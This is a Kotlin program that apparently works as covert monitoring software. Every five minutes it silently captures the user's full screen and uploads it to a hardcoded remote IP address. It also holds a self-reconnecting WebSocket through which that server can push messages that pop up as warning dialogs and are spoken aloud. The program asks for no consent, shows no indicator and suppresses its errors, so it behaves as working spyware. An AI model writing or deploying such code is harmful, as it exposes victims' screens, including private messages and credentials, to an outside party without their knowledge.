package io.github.igoronxiao

import javazoom.jl.player.Player
import okhttp3.*
import okio.ByteString
import java.awt.Rectangle
import java.awt.Robot
import java.awt.Toolkit
import java.io.*
import java.util.*
import java.util.concurrent.TimeUnit
import javax.imageio.ImageIO
import javax.swing.JOptionPane.WARNING_MESSAGE
import javax.swing.JOptionPane.showMessageDialog


val IMG_FILE = File("D:/up/cut.png")
val MEDEA_FILE_PATH = "D:/up/media.mp3"
//val WEBSOCKET_URL = "http://127.0.0.1/ws"
val WEBSOCKET_URL = "http://39.108.6.47/ws"
//val UPLOAD_URL = "http://127.0.0.1/upload"
val UPLOAD_URL = "http://39.108.6.47/upload"
val robot = Robot()

fun main(args: Array<String>) {
    Timer().schedule(object : TimerTask() {
        override fun run() = handleScreenShot()
    }, 1000 * 60 * 5, 1000 * 60 * 5)

    Timer().schedule(object : TimerTask() {
        override fun run() = handleWebsocket()
    }, 1000 * 60 * 5)

}

fun handleScreenShot() {
    try {
        val client = OkHttpClient()
        val screenCapturedImg = robot.createScreenCapture(Rectangle(Toolkit.getDefaultToolkit().screenSize))
        ImageIO.write(screenCapturedImg, "png", IMG_FILE)
        if (IMG_FILE.isFile) {
            val requestBody = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("file", "fullScreenShot.pnt", RequestBody.create(MediaType.parse("image/png"), IMG_FILE))
                    .build()
            val request = Request.Builder().url(UPLOAD_URL)
                    .post(requestBody).build()
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) {
                throw IOException("Unexpected code " + response)
            }
            IMG_FILE.delete()
            response.close()
        } else {
            println("not a file")
        }
    } catch (e: Exception) {
        println("error...")
        //System.exit(0)
    }
}

fun handleWebsocket() {
    OkHttpClient.Builder()
            .readTimeout(3000, TimeUnit.SECONDS)
            .writeTimeout(3000, TimeUnit.SECONDS)
            .connectTimeout(30000, TimeUnit.SECONDS)
            .build().newWebSocket(Request.Builder().url(WEBSOCKET_URL).build(), object : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            Timer().schedule(object : TimerTask() {
                override fun run() {
                    webSocket.send("-")
                    print("tick...")
                }
            }, 1000, 1000 * 16)
        }

        override fun onMessage(webSocket: WebSocket, bytes: ByteString) = println(bytes)
        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) = Unit
        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) = handleWebsocket()
        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response) = Unit
        override fun onMessage(webSocket: WebSocket, text: String) {
            // 0: 连接成功 1：执行命令成功 -：心跳
            if ("0" != text && "1" != text && "-" != text) {
                webSocket.send("1")
                showWarningMessage(text)
                readText(text)
            }
        }
    })
}

fun showWarningMessage(msg: String?) {
    Thread {
        showMessageDialog(null, msg, "警告", WARNING_MESSAGE);
    }.start()
}

fun readText(msg: String) {
    Thread {
        val client = OkHttpClient()
        val req = Request.Builder().url("http://tts.baidu.com/text2audio?lan=zh&pid=101&ie=UTF-8&text=${msg}&spd=3").addHeader("Content-Type", "application/json").build()
        val rep = client.newCall(req).execute()
        val fos = FileOutputStream(MEDEA_FILE_PATH)
        fos.write(rep.body().bytes())
        fos.close()
        val buffer = BufferedInputStream(FileInputStream(MEDEA_FILE_PATH));
        val player = Player(buffer);
        player.play();
    }.start()
}